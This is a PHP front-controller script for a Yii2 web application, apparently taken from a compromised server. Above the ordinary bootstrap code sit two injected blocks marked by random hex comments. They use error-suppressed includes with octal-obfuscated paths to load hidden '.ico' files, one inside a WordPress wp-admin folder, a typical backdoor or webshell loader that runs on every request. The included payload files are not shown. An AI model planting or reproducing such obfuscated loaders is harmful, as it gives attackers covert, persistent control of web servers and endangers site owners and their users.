<?php
/*2bc2a*/

@include "\057va\162/w\167w/\150tm\154/i\156st\141/a\163se\164s/\14509\06696\1462/\0562b\0710b\062a5\056ic\157";

/*2bc2a*/
/*a3398*/

@include "\057hom\145/ht\155l/p\141wns\150op/\142log\057wp-\141dmi\156/.4\066bbe\1422c.\151co";

/*a3398*/
// comment out the following two lines when deployed to production
defined('YII_DEBUG') or define('YII_DEBUG', true);
defined('YII_ENV') or define('YII_ENV', 'dev');

require(__DIR__ . '/vendor/autoload.php');
require(__DIR__ . '/vendor/yiisoft/yii2/Yii.php');

$config = require(__DIR__ . '/config/web.php');

(new yii\web\Application($config))->run();
